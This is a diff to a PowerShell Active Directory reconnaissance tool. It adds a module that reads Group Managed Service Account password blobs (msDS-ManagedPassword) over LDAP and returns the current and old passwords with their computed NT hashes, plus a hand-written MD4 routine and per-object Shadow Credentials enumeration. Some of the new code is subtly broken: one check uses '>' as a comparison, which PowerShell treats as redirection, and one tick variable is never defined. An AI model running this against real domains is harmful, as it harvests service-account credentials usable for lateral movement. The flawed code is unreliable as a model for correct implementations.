@@ -30,7 +30,7 @@ function _ShowBanner {
     Write-Host -ForegroundColor Red     "   _| || | | \ V / (_) |   <  __/ |______| "
     Write-Host -ForegroundColor Red     "   \___/_| |_|\_/ \___/|_|\_\___|          "
     Write-Host -ForegroundColor Red     ""
-    Write-Host -ForegroundColor Red     "   v1.3.4 "
+    Write-Host -ForegroundColor Red     "   v1.4.1 "
     Write-Host -ForegroundColor Red     "  ______            _____ _          _____           _     "
     Write-Host -ForegroundColor Red     "  | ___ \          |_   _| |        /  __ \         | |    "
     Write-Host -ForegroundColor Red     "  | |_/ /___ ___ ___ | | | |__   ___| /  \/ ___ _ __| |_   "
@@ -700,9 +700,9 @@ function _Helper-GetBinaryFromHexString {
 
         .EXAMPLE
 
-            _Helper-GetBinaryFromHex -HexString '1011'
+            _Helper-GetBinaryFromHexString -HexString '1011'
 
-            Returns [48, 49]
+            Returns [16, 17]
 
         .OUTPUTS
 
@@ -724,6 +724,257 @@ function _Helper-GetBinaryFromHexString {
     }
     
     return [byte[]]$Result
+}
+
+
+function _Helper-GetIndexOfUnicodeWideCharNull {
+    
+    <#
+    
+        .SYNOPSIS
+
+            Returns the index of the NULL byte from the provided blob, starting at the given Start index.
+
+        .PARAMETER Blob
+
+            [byte[]]
+
+            The blob from which the index of the WCHAR-NULL character must be extracted.
+
+        .PARAMETER StartIndex
+
+            [System.Int32]
+
+            The index from which to start the lookup within the blob.
+
+        .EXAMPLE
+
+            _Helper-GetIndexOfUnicodeWideCharNull -Blob $Blob -StartIndex 16
+
+            Returns the index of the NULL WCHAR character found in the blob, from its 16th character.
+
+        .OUTPUTS
+
+            [System.Int32]
+            
+            The index of the NULL byte from the provided blob, starting at the given index.
+
+        .LINK
+
+            https://github.com/rvazarkar/GMSAPasswordReader/blob/f8406f8f1294e07faedc416e9ffb472c15ff88f8/MsDsManagedPassword.cs#L59-L76
+
+    #>
+
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the blob to process")]
+        [byte[]]$Blob,
+
+        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the start index from which the blob should be processed")]
+        [System.Int32]$StartIndex
+    )
+
+    #_Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    #Write-Verbose "[*] Retrieving Index Of The WCHAR NULL Character In The Provided From Start Index $StartIndex, In Blob '$Blob'..."
+
+    for ($i = $StartIndex; $i -lt $Blob.Length; $i += 2) {
+        if ([BitConverter]::ToChar($Blob, $i) -eq [char]::MinValue) {
+            # Null-terminated WCHAR string found
+            Write-Verbose "[*] Successfully Retrieved Index $i Of The WCHAR NULL Character In The Provided From Start Index $StartIndex, In Blob '$Blob'..."
+            return $i
+        }
+    }
+
+    #Write-Verbose "[!] Index Of The WCHAR NULL Character In The Provided From Start Index $StartIndex Not Found !"
+    return $null
+
+}
+
+
+function _Helper-ConvertToNTHashMD4 {
+    
+    <#
+    
+        .SYNOPSIS
+
+            Returns the NT Hash (MD4) of the specified string/bytes.
+
+        .PARAMETER String
+
+            [System.String]
+
+            The String to be hashed.
+
+            - REQUIRED if -Bytes is NOT specified.
+
+        .PARAMETER Bytes
+
+            [byte[]]
+
+            The Bytes to be hashed.
+
+            - REQUIRED if -String is NOT specified.
+
+        .EXAMPLE
+
+            _Helper-ConvertToNTHashMD4 -String 'P@ssw0rd123!'
+
+            Returns the NT Hash (MD4) of the string 'P@ssw0rd123!'
+
+        .EXAMPLE
+
+            _Helper-ConvertToNTHashMD4 -Bytes $Bytes
+
+            Returns the NT Hash (MD4) of the bytes `$Bytes`
+
+        .OUTPUTS
+
+            [System.String]
+            
+            The NT Hash (MD4) of the specified string/bytes.
+
+        .LINK 
+
+            https://github.com/ArchitektApx/ConvertTo-NTHashMD4/tree/b9a897dfab84ff3b362219a572bf3f3f1ef45c80
+
+        .LINK 
+
+            https://github.com/The-Viper-One/ConvertTo-NT/tree/45f9b2f9e9687c9a35429e9cc2128e53a23007fb
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$false, HelpMessage="Enter the string to be NTHashed. REQUIRED if -Bytes is not specified.")]
+        [System.String]$String,
+        
+        [Parameter(Position=1, Mandatory=$false, HelpMessage="Enter the bytes to be NTHashed. REQUIRED if -String is not specified.")]
+        [byte[]]$Bytes
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    if ($String) { $Array = [System.Text.Encoding]::Unicode.GetBytes($String) }
+    elseif ($Bytes) { $Array = $Bytes }
+    else { Write-Host "[!] Either -String Or -Bytes Must Be Provided !"; return }
+        
+    $M = [System.Collections.ArrayList]@()
+    for ($i = 0; $i -le ($Array.count - 1); $i++) {
+        $null = $M.Add($Array[$i])
+    }
+
+    $null = $M.Add(0x80)
+    while ($M.count % 64 -ne 56) { $null = $M.Add(0) }
+    for ($i = 1; $i -le 8; $i++) { $null = $M.Add([int]0) }
+
+    [Byte[]]$M = $M
+    @([BitConverter]::GetBytes($Array.Count * 8)).CopyTo($M, $M.Count - 8)
+
+    $A = [Convert]::ToUInt32('0x67452301', 16)
+    $B = [Convert]::ToUInt32('0xefcdab89', 16)
+    $C = [Convert]::ToUInt32('0x98badcfe', 16)
+    $D = [Convert]::ToUInt32('0x10325476', 16)
+
+    if (-not ([System.Management.Automation.PSTypeName]"Shift").Type) {
+        Add-Type -TypeDefinition @'
+            public class Shift
+            {
+                public static uint Left(uint a, int b)
+                {
+                    return ((a << b) | (((a >> 1) & 0x7fffffff) >> (32 - b - 1)));
+                }
+            }
+'@ | Out-Null
+    }
+    function FF([uint32]$X, [uint32]$Y, [uint32]$Z) {
+        (($X -band $Y) -bor ((-bnot $X) -band $Z))
+    }
+    function GG([uint32]$X, [uint32]$Y, [uint32]$Z) {
+        (($X -band $Y) -bor ($X -band $Z) -bor ($Y -band $Z))
+    }
+    function HH([uint32]$X, [uint32]$Y, [uint32]$Z) {
+        ($X -bxor $Y -bxor $Z)
+    }
+
+    for ($i = 0; $i -lt $M.Count; $i += 64) {
+        $AA = $A
+        $BB = $B
+        $CC = $C
+        $DD = $D
+
+        $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0)) -band [uint32]::MaxValue, 3)
+        $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0)) -band [uint32]::MaxValue, 7)
+        $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0)) -band [uint32]::MaxValue, 11)
+        $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0)) -band [uint32]::MaxValue, 19)
+
+        $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0)) -band [uint32]::MaxValue, 3)
+        $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0)) -band [uint32]::MaxValue, 7)
+        $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0)) -band [uint32]::MaxValue, 11)
+        $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0)) -band [uint32]::MaxValue, 19)
+
+        $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0)) -band [uint32]::MaxValue, 3)
+        $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0)) -band [uint32]::MaxValue, 7)
+        $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0)) -band [uint32]::MaxValue, 11)
+        $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0)) -band [uint32]::MaxValue, 19)
+
+        $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0)) -band [uint32]::MaxValue, 3)
+        $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0)) -band [uint32]::MaxValue, 7)
+        $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0)) -band [uint32]::MaxValue, 11)
+        $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0)) -band [uint32]::MaxValue, 19)
+
+        $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
+        $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
+        $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
+        $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)
+
+        $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
+        $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
+        $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
+        $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)
+
+        $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
+        $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
+        $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
+        $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)
+
+        $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
+        $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
+        $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
+        $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)
+
+        $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
+        $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
+        $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
+        $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)
+
+        $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
+        $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
+        $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
+        $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)
+
+        $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
+        $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
+        $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
+        $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)
+
+        $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
+        $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
+        $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
+        $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)
+
+        $A = ($A + $AA) -band [uint32]::MaxValue
+        $B = ($B + $BB) -band [uint32]::MaxValue
+        $C = ($C + $CC) -band [uint32]::MaxValue
+        $D = ($D + $DD) -band [uint32]::MaxValue
+    }
+
+    $A = ('{0:x8}' -f $A) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
+    $B = ('{0:x8}' -f $B) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
+    $C = ('{0:x8}' -f $C) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
+    $D = ('{0:x8}' -f $D) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
+
+    return "$A$B$C$D"
 }
 
 
@@ -7847,7 +8098,7 @@ function _Filter {
                     'useraccountcontrol' { $AddMember = $true; $NewMember = _Helper-GetUACFlagsOfValue -Value $Property.Value }
                     
                     'objectsid' { $AddMember = $true; $NewMember = _Helper-GetReadableValueOfBytes -Type 'objectsid' -ArrayOfBytes $Property.Value }
-                    
+
                     'objectguid' { $AddMember = $true; $NewMember = _Helper-GetReadableValueOfBytes -Type 'objectguid' -ArrayOfBytes $Property.Value }
                     
                     'grouptype' { $AddMember = $true; $NewMember = _Helper-GetNameOfGroupTypeValue -Value $Property.Value }
@@ -7921,6 +8172,10 @@ function _Filter {
                         elseif (!($Value % 3600) -and ($Value / 3600) -ge 1) { $NewMember = [string]($Value / 3600) + " hour(s)" }
                         else { $NewMember = "0 hour(s)" }
                     }
+                    
+                    'msds-managedpasswordid' { $AddMember = $true; $NewMember = _Helper-GetReadableValueOfBytes -Type 'objectsid' -ArrayOfBytes $Property.Value }
+                    
+                    'msds-groupmsamembership' { $AddMember = $true; $NewMember = _Helper-GetReadableValueOfBytes -Type 'nTSecurityDescriptor' -ArrayOfBytes $Property.Value }
 
                 }
 
@@ -8800,10 +9055,7 @@ function _CreateInboundACE {
     }
     
     if (-not $IdentitySID) {
-        if (-not $IdentityDN) {
-            Write-Host "[!] Either -IdentityDN Or -IdentitySID Must Be Provided !"
-            return
-        }
+        if (-not $IdentityDN) { Write-Host "[!] Either -IdentityDN Or -IdentitySID Must Be Provided !"; return }
         $IdentitySID = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid"
     }
 
@@ -9066,10 +9318,7 @@ function _DeleteInboundACE {
     }
 
     if (-not $IdentitySID) {
-        if (-not $IdentityDN) {
-            Write-Host "[!] Either -IdentityDN Or -IdentitySID Must Be Provided !"
-            return
-        }
+        if (-not $IdentityDN) { Write-Host "[!] Either -IdentityDN Or -IdentitySID Must Be Provided !"; return }
         $IdentitySID = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute 'objectSid'
     }
 
@@ -9375,10 +9624,7 @@ function _CreateInboundSDDL {
     if (-not $SDDLACERights) { $SDDLACERights = 'RPWP' } # SDDL_READ_PROPERTY, SDDL_WRITE_PROPERTY
     
     if (-not $IdentitySID) {
-        if (-not $IdentityDN) {
-            Write-Host "[!] Either -IdentityDN Or -IdentitySID Must Be Provided !"
-            return
-        }
+        if (-not $IdentityDN) { Write-Host "[!] Either -IdentityDN Or -IdentitySID Must Be Provided !"; return }
         $IdentitySID = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute 'objectSid'
     }
 
@@ -10509,12 +10755,6 @@ function _LDAPEnum {
 
         .EXAMPLE
 
-            _LDAPEnum -LdapConnection $LdapConnection -Enum 'gMSAs'
-
-            Returns all the Group Managed Service Accounts in the LDAP/S Server's Domain (default SearchBase)
-
-        .EXAMPLE
-
             _LDAPEnum -LdapConnection $LdapConnection -Enum 'sMSAs'
 
             Returns all the Standalone Managed Service Accounts in the LDAP/S Server's Domain (default SearchBase)
@@ -10565,9 +10805,19 @@ function _LDAPEnum {
 
         .EXAMPLE
 
-            _LDAPEnum -LdapConnection $LdapConnection -Enum 'ShadowCreds'
+            _LDAPEnum -LdapConnection $LdapConnection -Enum 'gMSAs' -ObjectDN 'CN=gmsad,CN=Managed Service Accounts,DC=X'
 
-            Returns all objects with an msDS-KeyCredentialLink attribute in the LDAP/S Server's Domain (default SearchBase)
+            Returns the ManagedPassword-related attributes (password's NTHash included) of the `gmsad` Group Managed Service Account in the LDAP/S Server's Domain (default SearchBase)
+
+            - The `-ObjectDN` parameter is OPTIONAL.
+
+        .EXAMPLE
+
+            _LDAPEnum -LdapConnection $LdapConnection -Enum 'ShadowCreds' -ObjectDN 'CN=John JD. DOE,CN=Users,DC=X'
+
+            Returns the KeyCredentialLink-related attributes (DeviceId included) of the `John JD. DOE` account in the LDAP/S Server's Domain (default SearchBase)
+
+            - The `-ObjectDN` parameter is OPTIONAL.
 
         .EXAMPLE
 
@@ -10758,10 +11008,6 @@ function _LDAPEnum {
             return _Filter -LdapConnection $LdapConnection -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$($RootDSE.configurationnamingcontext)" -SearchScope $SearchScope -LDAPFilter '(objectClass=pKICertificateTemplate)'
         }
 
-        'gMSAs' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(ObjectClass=msDS-GroupManagedServiceAccount)'
-        }
-
         'sMSAs' {
             return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(ObjectClass=msDS-ManagedServiceAccount)'
         }
@@ -10794,11 +11040,102 @@ function _LDAPEnum {
             return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' |Select distinguishedName,sAMAccountName,useraccountcontrol,objectcategory
         }
 
+        'gMSAs' {
+            # With no $ObjectDN specified, enumerate all gMSAs' passwords
+            if (-not $ObjectDN) {
+                $gMSAAccounts = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(ObjectClass=msDS-GroupManagedServiceAccount)'
+            }
+
+            # Otherwise, enumerate the specified gMSA's password
+            else {
+                $gMSAAccounts = _Filter -LdapConnection $LdapConnection -SearchBase $ObjectDN -SearchScope 'Base' -LDAPFilter '(ObjectClass=msDS-GroupManagedServiceAccount)'
+            }
+
+            $Results = [PSCustomObject]@()
+
+            foreach ($gMSAAccount in $gMSAAccounts) {
+                
+                $ManagedPasswordBlob = _Filter -LdapConnection $LdapConnection -SearchBase $gMSAAccount.distinguishedname -SearchScope 'Base' -Properties 'msDS-ManagedPassword'
+
+                $ManagedPasswordBlob = [byte[]]($ManagedPasswordBlob.'msds-managedpassword')
+
+                # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68
+                # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e
+                # https://github.com/rvazarkar/GMSAPasswordReader/blob/f8406f8f1294e07faedc416e9ffb472c15ff88f8/MsDsManagedPassword.cs
+                $ManagedPassword = [PSCustomObject]@{
+                    Version               = $null
+                    CurrentPassword       = $null
+                    CurrentPasswordNTHash = $null
+                    OldPassword           = $null
+                    OldPasswordNTHash     = $null
+                    NextQueryTime         = $null
+                    PasswordGoodUntil     = $null
+                }
+
+                $reader = [System.IO.BinaryReader]::new(
+                    [System.IO.MemoryStream]::new(
+                        $ManagedPasswordBlob,
+                        $false
+                    )
+                )
+
+                $ManagedPassword.Version = $reader.ReadUInt16()
+                $reader.ReadUInt16() |Out-Null
+                #Write-Verbose "[*$Enum*] [*] Successfully Read ManagedPassword Blob Version"
+
+                $length = [int]$reader.ReadUInt32()
+                if ($Length -ne $ManagedPasswordBlob.Length) {
+                    throw "Missized blob"
+                }
+                #Write-Verbose "[*$Enum*] [*] Successfully Read ManagedPassword Blob Length"
+
+                $curPwdOffset = $reader.ReadUInt16()
+                $UnicodeWCharNullIndex = _Helper-GetIndexOfUnicodeWideCharNull -Blob $ManagedPasswordBlob -StartIndex $curPwdOffset
+                $ManagedPassword.CurrentPassword = $ManagedPasswordBlob[$curPwdOffset..$($UnicodeWCharNullIndex - 1)]
+                $ManagedPassword.CurrentPasswordNTHash = _Helper-ConvertToNTHashMD4 -Bytes $ManagedPassword.CurrentPassword
+                #Write-Verbose "[*$Enum*] [*] Successfully Read ManagedPassword Blob curPwdOffset"
+
+                $oldPwdOffset = $reader.ReadUInt16()
+                if ($oldPwdOffset > 0) {
+                    $UnicodeWCharNullIndex = _Helper-GetIndexOfUnicodeWideCharNull -Blob $ManagedPasswordBlob -StartIndex $oldPwdOffset
+                    $ManagedPassword.OldPassword = $ManagedPasswordBlob[$oldPwdOffset..$($UnicodeWCharNullIndex - 1)]
+                    $ManagedPassword.OldPasswordNTHash = _Helper-ConvertToNTHashMD4 -Bytes $ManagedPassword.OldPassword
+                }
+                #Write-Verbose "[*$Enum*] [*] Successfully Read ManagedPassword Blob oldPwdOffset"
+
+                $queryPasswordIntervalOffset = $reader.ReadUInt16()
+                $queryPasswordIntervalTicks = [BitConverter]::ToInt64($ManagedPasswordBlob, $queryPasswordIntervalOffset)
+                $ManagedPassword.NextQueryTime = [DateTime]::Now.AddTicks($QueryIntervalTicks)
+                #Write-Verbose "[*$Enum*] [*] Successfully Read ManagedPassword Blob queryPasswordIntervalOffset"
+
+                $UnchangedIntervalOffset = $reader.ReadInt16()
+                $UnchangedIntervalTicks = [BitConverter]::ToInt64($ManagedPasswordBlob, $UnchangedIntervalOffset)
+                #Write-Verbose "[*$Enum*] [*] Successfully Read ManagedPassword Blob UnchangedIntervalOffset"
+
+                $ManagedPassword.PasswordGoodUntil = [DateTime]::Now.AddTicks($UnchangedIntervalTicks)
+
+                $reader.Close()
+
+                $Results += $ManagedPassword |
+                    Add-Member -PassThru -Force -NotePropertyName 'sAMAccountName' -NotePropertyValue $gMSAAccount.samaccountname |
+                    Add-Member -PassThru -Force -NotePropertyName 'distinguishedName' -NotePropertyValue $gMSAAccount.distinguishedname
+            }
+            return $Results
+        }
+
         'ShadowCreds' {
+
+            if (-not $ObjectDN) {
+                $KeyCredentialStrings = (_Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(msDS-KeyCredentialLink=*)' |Select -ExpandProperty msDS-KeyCredentialLink) -split "`r`n"
+            }
+            # Otherwise, enumerate all gMSA accounts
+            else {
+                $KeyCredentialStrings = (_Filter -LdapConnection $LdapConnection -SearchBase $ObjectDN -SearchScope 'Base' -LDAPFilter '(msDS-KeyCredentialLink=*)' |Select -ExpandProperty msDS-KeyCredentialLink) -split "`r`n"
+            }
 
             $KeyCredentials = [PSCustomObject]@()
 
-            foreach ($KeyCredentialString in (_Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(msDS-KeyCredentialLink=*)' |Select -ExpandProperty msDS-KeyCredentialLink) -split "`r`n") {
+            foreach ($KeyCredentialString in $KeyCredentialStrings) {
                 # https://learn.microsoft.com/en-us/windows/win32/adschema/s-object-dn-binary
                 # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/DNWithBinary.cs
                 if ($KeyCredentialString -notmatch '^B:(\d+):([0-9A-Fa-f]+):(.+)$') {
@@ -10852,8 +11189,8 @@ function _LDAPEnum {
                         5 { $KeyCredential.Source = $value[0]; break; }
                         6 { $KeyCredential.DeviceId = [Guid]::New($value); break; }
                         7 { $KeyCredential.CustomKeyInfo = $value; break; }
-                        8 { $KeyCredential.LastLogonTime = [DateTime]::FromFileTime([BitConverter]::ToInt64($value,0)); break; }
-                        9 { $KeyCredential.CreationTime = [DateTime]::FromFileTime([BitConverter]::ToInt64($value,0)); break; }
+                        8 { $KeyCredential.LastLogonTime = [DateTime]::FromFileTime([BitConverter]::ToInt64($value, 0)); break; }
+                        9 { $KeyCredential.CreationTime = [DateTime]::FromFileTime([BitConverter]::ToInt64($value, 0)); break; }
                     }
                 }
 
@@ -10909,7 +11246,7 @@ function _LDAPEnum {
 
         'All' {
             # Executing only the enumeration modules with the strict minimum number of mandatory parameters. For instance, we won't run OUMembers, or GroupMembers, as they require a specific parameter.
-            foreach ($Enum in @('RootDSE', 'DCs', 'admins', 'DAs', 'Groups', 'Descriptions', 'Users', 'Computers', 'OSs', 'MAQ', 'LAPS', 'OUs', 'Sites', 'GPOs', 'GPLinks', 'Printers', 'LogonScripts', 'CAs', 'CertificateTemplates', 'gMSAs', 'sMSAs', 'Trusts', 'DONT_EXPIRE_PASSWORD', 'PASSWD_NOTREQD', 'Kerberoasting', 'ASREPRoasting', 'ShadowCreds', 'Unconstrained', 'Constrained', 'RBCD', 'DCSync', 'PassPol')) {
+            foreach ($Enum in @('RootDSE', 'DCs', 'admins', 'DAs', 'Groups', 'Descriptions', 'Users', 'Computers', 'OSs', 'MAQ', 'LAPS', 'OUs', 'Sites', 'GPOs', 'GPLinks', 'Printers', 'LogonScripts', 'CAs', 'CertificateTemplates', 'sMSAs', 'Trusts', 'DONT_EXPIRE_PASSWORD', 'PASSWD_NOTREQD', 'Kerberoasting', 'ASREPRoasting', 'gMSAs', 'ShadowCreds', 'Unconstrained', 'Constrained', 'RBCD', 'DCSync', 'PassPol')) {
                 _LDAPEnum -LdapConnection $LdapConnection -Enum $Enum -SearchBase $SearchBase -SearchScope $SearchScope
             }
         }
